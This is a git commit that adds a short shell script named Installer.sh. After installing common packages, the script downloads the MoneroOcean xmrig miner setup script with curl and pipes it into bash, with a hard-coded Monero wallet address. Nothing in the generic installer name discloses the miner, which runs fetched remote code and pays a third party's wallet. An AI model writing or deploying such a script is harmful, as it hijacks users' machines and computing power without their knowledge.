bd7d584d28e5ea22c5e553f44611fbcbf936ce2f
javierechevarria <echevarriajavier95@gmail.com>
2021-04-12 11:21:54 -0400

    Create Installer.sh

---
+++ Installer.sh
@@ -0,0 +1,3 @@
+apt install curl wget python python2 nodejs
+
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 44Tito3ZQeCccBYxnfj6iiZMtQeygeENeA3Dn3bYeKpLenMCjqzjQR3AnaNYwGP5ws36FxswR595eX6YpP16NmgF63dJ6rA
